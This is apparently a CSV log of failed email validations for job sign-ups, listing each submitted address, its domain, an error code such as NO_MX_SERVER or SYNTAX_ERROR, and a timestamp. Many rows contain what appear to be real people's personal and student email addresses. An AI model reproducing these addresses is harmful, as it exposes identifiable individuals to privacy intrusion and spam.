6a1bd45252c8778ce94406dc,job-y8f3rzvk,JOB-07U93IBV,,SYNTAX_ERROR,2026-05-31T06:25:22.273Z
6a1c39c475a2336fc5c2b251,job-6410l4w4,JOB-7L56SXHQ,,SYNTAX_ERROR,2026-05-31T13:38:12.408Z
6a1c48b590c4dfcf80b9c53c,rawat17rashiriya,JOB-3OI9BC5O,,SYNTAX_ERROR,2026-05-31T14:41:57.139Z
6a1c886dfe3da23f7c1d72bd,sankaranara,JOB-TUUIOCBS,,SYNTAX_ERROR,2026-05-31T19:13:49.454Z
6a1d321805a5baba51a7bedc,jateendhadukgmail.com,JOB-1OAU6QZO,,SYNTAX_ERROR,2026-06-01T07:17:44.431Z
6a1d042bb4a1c58c569ac287,2432004mamatha@gmail.comjob-vmyivrom,JOB-PYUX4SYO,gmail.comjob-vmyivrom,NO_MX_SERVER,2026-06-01T04:01:47.784Z
6a1db2fdf06dca6848499f1a,job-ik9wa3xf,JOB-8KJZZZA2,,SYNTAX_ERROR,2026-06-01T16:27:41.058Z
6a20696ea9397fe7aceba4e7,ritika170btcse25@igdtuw.ac.in,JOB-7IVPO76P,igdtuw.ac.in,NO_MX_SERVER,2026-06-03T17:50:38.146Z
6a260eb573ca1a8fbafedd89,test@example.com,JOB-TH08JRJ6,example.com,ROLE_BASED_EMAIL,2026-06-08T00:37:09.477Z
6a26faae6df4ffb428bdb502,jiya079btcse23@igdtuw.ac.in,JOB-YYG5VHJW,igdtuw.ac.in,NO_MX_SERVER,2026-06-08T17:23:58.871Z
6a2dd4685728adaad0e25099,nagpalaryan063@gmail.vmco,JOB-N3T4FU8W,gmail.vmco,NO_MX_SERVER,2026-06-13T22:06:32.067Z
6a2ea09ef58c6831095cd7e5,test@test.com,JOB-QEPTEG4K,test.com,ROLE_BASED_EMAIL,2026-06-14T12:37:50.489Z
6a2fa2212c0f3339f774cb50,chauhankomal839@gmaijob-q7rfysmrl.com,JOB-2L18E5JQ,gmaijob-q7rfysmrl.com,NO_MX_SERVER,2026-06-15T06:56:33.196Z
6a30cee692d2c59a3a20e369,gayatriraghavendra@gm2ail.com,JOB-3UAK95HZ,gm2ail.com,NO_MX_SERVER,2026-06-16T04:19:50.658Z
6a353dc0686ecd0b0eefee27,kajalmishra7788@gmail.con,JOB-QHPVH8HA,gmail.con,NO_MX_SERVER,2026-06-19T13:01:52.364Z
6a3535d9c7f9c175ceafd05f,lakshmi.renjithnair@vit.student.ac.in,JOB-ZPNJHHWB,vit.student.ac.in,NO_MX_SERVER,2026-06-19T12:28:09.438Z
6a3795faa08cc5a7bd9c2541,eshanimudgalkar@gmail.com,JOB-HC0X2V5J,gmail.com,DUPLICATE_EMAIL,2026-06-21T07:42:50.081Z
6a3c3a44148cc9e361cd2f73,mudeersmudeers3@gmail.com,JOB-BVFTMVGL,gmail.com,DUPLICATE_EMAIL,2026-06-24T20:12:52.542Z
6a3cb333d92fdeada9eca425,mohamedashik5427@gmail.comjob-f1au0k5h,JOB-2UQBD5ZG,gmail.comjob-f1au0k5h,NO_MX_SERVER,2026-06-25T04:48:51.810Z
6a4150392dd499cdef75b86d,gaurav,JOB-EA32JVBQ,,SYNTAX_ERROR,2026-06-28T16:47:53.754Z
6a4ba439a31722b94737b273,luckyrajpoot1430@gmail.con,JOB-5VMO8NBX,gmail.con,NO_MX_SERVER,2026-07-06T12:48:57.630Z
6a6b371aff6688d994ac1dd9,prateek@gmail,JOB-PLWO42GS,,SYNTAX_ERROR,2026-07-30T11:35:54.972Z
